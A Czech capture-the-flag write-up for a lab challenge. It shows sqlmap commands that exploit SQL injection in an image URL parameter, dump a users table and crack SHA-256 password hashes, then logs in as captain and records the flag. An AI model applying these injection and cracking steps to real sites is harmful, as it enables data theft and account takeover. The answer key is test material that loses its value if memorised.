# Navigation plan

## Zadání 

Ahoy, officer,

the chief officer was invited to a naval espresso by the captain and now they are both unfit for duty. The second officer is very busy and he has asked you to find out where are we heading according to the navigation plan.

May you have fair winds and following seas!

The navigation plan webpage is available at [http://navigation-plan.cns-jv.tcc](http://navigation-plan.cns-jv.tcc).

Hint: Details should contain the desired information.

## Řešení

- z webu: *Everyone sees the plan according to their rank. Only captain or chief officer can see details.*

### Slepá ulička 1

- při volání http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=0
```
Warning: Trying to access array offset on value of type null in /var/www/html/image.php on line 12

Deprecated: base64_decode(): Passing null to parameter #1 ($string) of type string is deprecated in /var/www/html/image.php on line 12
```

### Slepá ulička 2

- SQLinjection na tom přihlašovacím formuláři 
- není injektovatelný, lámání pomocí `sqlmap`
	- formulář: `$ sqlmap -u "http://navigation-plan.cns-jv.tcc/system/login.php" --data "username=admin&password=aaa&login=Enter" -p "username,password" --method POST`

### Správná cesta

- když si zobrazím jeden z obrázků v novém okně, dostanu URL `http://navigation-plan.cns-jv.tcc/image.png?type=data&t=targets&id=1` a spoustu balastu
	- ručním hraním s parametrem "id" mě nikam neposune
	- ručním hraním s parametrem "data" dostanu chybu
		```
		Fatal error: Uncaught mysqli_sql_exception: Unknown column 'x' in 'field list' in /var/www/html/image.php:9 Stack trace: #0 /var/www/html/image.php(9): mysqli_query(Object(mysqli), 'SELECT x FROM t...') #1 {main} thrown in /var/www/html/image.php on line 9
		```
- zavolám sqlmap: `sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=x&t=targets&id=1" --dump-all` a hrne to mraky dat
- zkusím dumpnout jen schéma [Sqlmap dumping all tables without data](https://security.stackexchange.com/questions/143477/sqlmap-dumping-all-tables-without-data): `sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=x&t=targets&id=1" --schema --exclude-sysdbs`
```
Database: navigation
Table: users
[5 columns]
+----------+----------------------+
| Column   | Type                 |
+----------+----------------------+
| rank     | tinyint(1)           |
| active   | tinyint(1)           |
| id       | smallint(5) unsigned |
| password | varchar(256)         |
| username | varchar(64)          |
+----------+----------------------+

```
- dump jen té konkrétní tabulky: `$ sqlmap -u "http://navigation-plan.cns-jv.tcc/image.png?type=x&t=targets&id=1" --dump -D navigation -T users`
```
[10:26:59] [INFO] retrieved: '1'
[10:26:59] [INFO] retrieved: '0'
[10:26:59] [INFO] retrieved: '1'
[10:26:59] [INFO] retrieved: '15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225'
[10:26:59] [INFO] retrieved: 'engeneer'
[10:26:59] [INFO] retrieved: '0'
[10:26:59] [INFO] retrieved: '1'
[10:27:00] [INFO] retrieved: '2'
[10:27:00] [INFO] retrieved: '7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537'
[10:27:00] [INFO] retrieved: 'captain'
[10:27:00] [INFO] retrieved: '1'
[10:27:00] [INFO] retrieved: '1'
[10:27:00] [INFO] retrieved: '3'
[10:27:00] [INFO] retrieved: '6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb'
[10:27:00] [INFO] retrieved: 'officer'
```
- nechám ho, aby mně ty hesla zlámal (musím mu předhodit slovník)
```
[10:27:00] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[10:28:57] [INFO] writing hashes to a temporary file '/tmp/sqlmapm3vyognz77481/sqlmaphashes-utx8iskp.txt' 
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[10:29:07] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> /usr/share/wordlists/rockyou.txt
[10:29:51] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] 
[10:29:59] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[10:29:59] [INFO] starting 2 processes 
[10:29:59] [INFO] cracked password '123456789' for user 'engeneer'                                                
Database: navigation                                                                                              
Table: users
[3 entries]
+----+--------+--------+------------------------------------------------------------------------------+----------+
| id | rank   | active | password                                                                     | username |
+----+--------+--------+------------------------------------------------------------------------------+----------+
| 1  | 1      | 0      | 15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 (123456789) | engeneer |
| 2  | 0      | 1      | 7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537             | captain  |
| 3  | 1      | 1      | 6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb             | officer  |
+----+--------+--------+------------------------------------------------------------------------------+----------+

[10:30:37] [INFO] table 'navigation.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/navigation-plan.cns-jv.tcc/dump/navigation/users.csv'                                                                            
[10:30:37] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/navigation-plan.cns-jv.tcc'
```
- podařilo se mu zlámat heslo jen pro inženýra, pro kapitána ne. ALE mám hash.
- dotaz na Hashes.com: `7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537:$captainamerica$`, tedy login/heslo: `captain / $captainamerica$`
- login do webu
- podle Hintu je něco důležitého v "Details" > Target #4 > `FLAG{fmIT-QkuR-FFUv-Zx44}`